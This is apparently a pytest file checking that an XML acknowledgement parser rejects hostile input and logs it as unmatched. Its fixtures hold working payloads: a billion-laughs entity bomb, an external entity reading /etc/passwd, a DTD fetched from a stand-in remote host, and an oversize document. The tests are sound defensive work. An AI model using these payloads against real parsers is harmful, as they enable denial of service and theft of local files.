"""SEC-11: hostile acknowledgement XML (billion laughs, external entities, DTDs, oversize) is rejected safely — no
expansion, no file or network access — and recorded as an unmatched/malformed acknowledgement (UNMATCHED_ACK)."""

from __future__ import annotations

import time

import pytest
from sqlalchemy import select
from workflow_support import WF

from lbf.adapters.skarvik.acks import parse_ack
from lbf.persistence import tables as t

LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol9 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">]>
<ACK msgid="LBX-01" seq="1" status="ACCEPTED" orderno="&lol9;" ts="2026-11-22T10:00:00" tz="Europe/Stockholm"/>"""
EXTERNAL = b"""<?xml version="1.0"?>
<!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<ACK msgid="LBX-01" seq="1" status="ACCEPTED" orderno="&xxe;" ts="2026-11-22T10:00:00" tz="Europe/Stockholm"/>"""
REMOTE_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE ACK SYSTEM "http://198.51.100.7/evil.dtd">
<ACK msgid="LBX-01" seq="1" status="ACCEPTED" ts="2026-11-22T10:00:00" tz="Europe/Stockholm"/>"""
OVERSIZE = b'<ACK msgid="LBX-01" seq="1" status="ACCEPTED" note="' + b"x" * 70_000 + b'"/>'
VALID = b'<ACK msgid="LBX-01" seq="1" status="ACCEPTED" orderno="NV-1" ts="2026-11-22T10:00:00" tz="Europe/Stockholm"/>'


@pytest.mark.parametrize("payload", [LAUGHS, EXTERNAL, REMOTE_DTD, OVERSIZE], ids=["billion-laughs", "external-entity",
                                                                                  "remote-dtd", "oversize"])
def test_hostile_acks_are_malformed_without_expansion(payload):
    started = time.monotonic()
    ack = parse_ack("ACK_LBX-01_1.xml", payload)
    assert ack.status == "MALFORMED" and ack.order_ref is None
    assert "root:" not in ack.detail and "lol" not in ack.detail  # nothing was expanded or read
    assert time.monotonic() - started < 1.0


def test_control_ack_parses():
    assert parse_ack("ACK_LBX-01_1.xml", VALID).status == "ACCEPTED"


@pytest.mark.db
def test_hostile_ack_on_the_share_becomes_unmatched_ack(app_engine, tmp_path):
    wf = WF(app_engine, tmp_path)
    acks_dir = wf.skarvik.exchange_dir / "outbox" / "acks"
    acks_dir.mkdir(parents=True, exist_ok=True)
    (acks_dir / "ACK_LBX-01_1.xml").write_bytes(LAUGHS)
    wf.engines.ack_poller.run_once()
    with wf.engine.connect() as conn:
        events = conn.execute(select(t.audit_events.c.event_type)).scalars().all()
        acks = conn.execute(select(t.acknowledgements.c.status)).scalars().all()
    assert events.count("UNMATCHED_ACK") == 1 and events.count("INTEGRITY_ALERT") == 1 and acks == ["MALFORMED"]
